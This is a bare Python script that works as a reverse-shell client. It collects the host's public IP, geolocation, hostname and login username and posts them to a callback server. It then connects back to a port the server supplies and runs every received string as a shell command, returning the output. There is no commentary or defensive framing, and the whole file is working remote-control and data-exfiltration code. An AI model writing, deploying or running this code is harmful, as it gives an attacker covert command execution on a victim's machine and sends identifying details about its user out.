import requests
import socket
import subprocess
import os , json 

def get_ip():
    response = requests.get('https://api64.ipify.org?format=json').json()
    return response["ip"]


def get_location():
    ip_address = get_ip()
    response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
    location_data = {
        "ip": ip_address,
        "city": response.get("city"),
        "region": response.get("region"),
        "country": response.get("country_name")
    }
    return location_data


def send_system_info(endpoint_url):
    ip_address = socket.gethostbyname(socket.gethostname())
    hostname = socket.gethostname()
    location = get_location()
    username = os.getlogin()

    data = {
        'ip_address': ip_address,
        'hostname': hostname,
        'location': ', '.join(f'{key}:{value}' for key, value in location.items()),
        'username': username
    }

    headers = {'Content-type': 'application/json'}
    response = requests.post(endpoint_url, data=json.dumps(data), headers=headers)

    k=response.json()
    print(k)
    return k

def run_command(command):
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return result.stdout.decode('utf-8')

data=send_system_info("http://127.0.0.1:5000/callback")


IP_ADDRESS = '127.0.0.1'
PORT = data['port']


client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

client_socket.connect((IP_ADDRESS, PORT))
print("Connected to the server")



while True:
    try:
        #data = input('-> ')
        #if data=='exit0':
        #    break
        #client_socket.send(data.encode())  # send data to the server        
        data = client_socket.recv(1024)
        if not data:
            break
        message = data.decode("utf-8")
        output=run_command(message)
        client_socket.send(output.encode())

        
    except socket.error:
        pass

client_socket.close()
print("Connection closed")